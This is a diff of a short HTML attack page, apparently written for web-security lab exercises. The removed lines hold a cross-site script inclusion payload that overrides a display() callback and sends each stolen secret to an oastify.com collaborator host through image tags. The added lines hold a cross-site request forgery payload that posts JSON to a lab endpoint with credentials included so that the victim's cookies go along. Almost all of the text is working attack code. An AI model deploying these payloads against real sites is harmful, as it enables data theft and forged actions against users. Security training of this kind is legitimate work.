@@ -1,23 +1,26 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <!-- 
-      1. DEFINE THE FUNCTION TO INTERCEPT DATA
-      The target page defines 'display(data)', so we define it here first.
-      When secrets.js loads and runs, it will call OUR version of display.
-    -->
     <script>
-        function display(data) {
-            for (var key in data){
-                document.write("<img src='https://dj0kl23k4gnvncg8gy82cxeoxf36r1fq.oastify.com/?s="+data[key]+"'/>");
-            }
-        }
+        // Automatically execute when the page loads
+        fetch('https://ptl-36aedc2631d9-e33984037284.libcurl.me/share', {
+            method: 'POST',
+            headers: {
+                // Must match the application/json content type
+                'Content-Type': 'application/json',
+            },
+            // The body must be stringified JSON
+            body: JSON.stringify({
+                "user": "test",
+                "id": 1
+            }),
+            // CRITICAL: This ensures the victim's cookies are sent with the request
+            credentials: 'include'
+        }).then(response => {
+            console.log('Request sent');
+        }).catch(error => {
+            console.error('Request failed (likely due to CORS):', error);
+        });
     </script>
-
-    <!-- 
-      3. LOAD THE VULNERABLE SCRIPT
-      This script will execute and call display(data) immediately.
-    -->
-    <script src="https://ptl-fa1bb21ced03-32651dfe4fdc.libcurl.me/secrets.js"></script>
 </body>
 </html>
